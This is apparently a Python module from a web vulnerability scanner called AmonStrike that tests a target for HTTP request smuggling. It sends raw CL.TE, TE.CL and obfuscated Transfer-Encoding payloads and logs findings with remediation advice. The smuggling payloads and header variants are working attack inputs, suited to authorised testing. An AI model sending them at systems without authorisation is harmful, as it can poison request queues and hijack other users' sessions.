"""
AmonStrike — HTTP Request Smuggling Module
Discovered by James Kettle (PortSwigger) — one of the most impactful
vulnerabilities of the 2010s-2020s.

Types:
  CL.TE — Frontend uses Content-Length, backend uses Transfer-Encoding
  TE.CL — Frontend uses Transfer-Encoding, backend uses Content-Length
  TE.TE — Both use Transfer-Encoding but handle obfuscation differently

Real-world impact: Account takeover, cache poisoning, WAF bypass,
                   access to internal endpoints.
"""

import re
import time
import socket
import ssl
from urllib.parse import urlparse
from .base import BaseModule


class HttpSmugglingModule(BaseModule):
    NAME        = "http_smuggling"
    DESCRIPTION = "HTTP Request Smuggling — CL.TE, TE.CL, TE.TE detection"

    def run(self):
        self.log("Testing for HTTP Request Smuggling...")

        self._test_cl_te()
        self._test_te_cl()
        self._test_te_te_obfuscation()
        self._test_response_queue_poisoning()

        self.log(f"HTTP Smuggling scan complete — {len(self.findings)} findings", "+")
        return self.result()

    def _raw_request(self, request_bytes, timeout=10):
        """Send raw HTTP request and return response."""
        parsed = urlparse(self.url)
        host   = parsed.hostname
        port   = parsed.port or (443 if parsed.scheme=="https" else 80)

        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            if parsed.scheme == "https":
                ctx  = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)

            sock.sendall(request_bytes)
            response = b""
            sock.settimeout(timeout)
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                pass
            sock.close()
            return response.decode("utf-8", errors="ignore")
        except Exception as e:
            return ""

    def _test_cl_te(self):
        """Test CL.TE smuggling — Content-Length frontend, TE backend."""
        host    = urlparse(self.url).hostname
        path    = urlparse(self.url).path or "/"

        # CL.TE payload — smuggles a partial POST request
        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"
        ).encode()

        # Send twice — second request should get poisoned response
        t1 = time.time()
        resp1 = self._raw_request(payload, timeout=5)
        resp2 = self._raw_request(payload, timeout=5)
        elapsed = time.time() - t1

        # Signs of smuggling: different response lengths, 400 errors, timeouts
        if resp2 and ("400 Bad Request" in resp2 or
                      "Invalid request" in resp2 or
                      (resp1 and len(resp1) != len(resp2) and abs(len(resp1)-len(resp2)) > 50)):
            self.add_finding(
                title="HTTP Request Smuggling (CL.TE) Detected",
                severity="CRITICAL",
                description="The server appears vulnerable to CL.TE HTTP Request Smuggling. An attacker can poison the request queue, bypass security controls, and potentially hijack other users' requests.",
                evidence=f"CL.TE test:\nPayload sent twice\nResp1 length: {len(resp1)}\nResp2 length: {len(resp2)}\nDifference indicates smuggling",
                remediation="Normalize Transfer-Encoding headers. Configure frontend/backend to use consistent header parsing. Reject requests with both CL and TE headers.",
                url=self.url,
                cve="CWE-444"
            )

    def _test_te_cl(self):
        """Test TE.CL smuggling — TE frontend, Content-Length backend."""
        host = urlparse(self.url).hostname
        path = urlparse(self.url).path or "/"

        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 3\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"G\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()

        resp = self._raw_request(payload, timeout=8)
        if resp and "400" not in resp and resp:
            # Time-based detection
            t1 = time.time()
            self._raw_request(payload, timeout=5)
            elapsed = time.time() - t1

            if elapsed > 4:
                self.add_finding(
                    title="HTTP Request Smuggling (TE.CL) — Timeout Indicator",
                    severity="HIGH",
                    description="Time-based detection suggests TE.CL HTTP Request Smuggling vulnerability. The backend hung waiting for the rest of the smuggled request.",
                    evidence=f"TE.CL timeout test\nElapsed: {elapsed:.2f}s (>4s indicates backend hanging)",
                    remediation="Configure servers to reject ambiguous requests. Use HTTP/2 where possible. Disable Transfer-Encoding support if not needed.",
                    url=self.url,
                    cve="CWE-444"
                )

    def _test_te_te_obfuscation(self):
        """Test TE.TE with obfuscated Transfer-Encoding headers."""
        host = urlparse(self.url).hostname
        path = urlparse(self.url).path or "/"

        # Various TE obfuscation techniques
        te_variants = [
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked, identity",
            "Transfer-Encoding: [tab]chunked",
            "X-Transfer-Encoding: chunked",
        ]

        for te_header in te_variants[:3]:
            payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 6\r\n"
                f"{te_header}\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
                f"G"
            ).encode()

            resp = self._raw_request(payload, timeout=5)
            if resp and "200" in resp[:50]:
                self.add_finding(
                    title=f"HTTP Smuggling TE.TE Obfuscation Accepted: {te_header[:30]}",
                    severity="HIGH",
                    description=f"Server accepted obfuscated Transfer-Encoding header: '{te_header}'. This may enable TE.TE smuggling attacks.",
                    evidence=f"Header: {te_header}\nServer returned 200 OK",
                    remediation="Normalize and validate Transfer-Encoding headers. Reject non-standard variants.",
                    url=self.url,
                    cve="CWE-444"
                )
                break

    def _test_response_queue_poisoning(self):
        """Test for response queue poisoning via H2.TE."""
        # Quick check for HTTP/2 support
        resp = self.get(headers={"Upgrade": "h2"})
        if resp:
            upgrade = resp.headers.get("Upgrade","")
            if "h2" in upgrade.lower():
                self.add_finding(
                    title="HTTP/2 Upgrade Supported — Check for H2.TE Smuggling",
                    severity="INFO",
                    description="Server supports HTTP/1.1 to HTTP/2 upgrade. Manual testing recommended for H2.TE request smuggling.",
                    evidence=f"Upgrade: {upgrade}",
                    remediation="Disable HTTP/1.1 upgrade if not needed. Test for H2.TE smuggling manually.",
                    url=self.url
                )
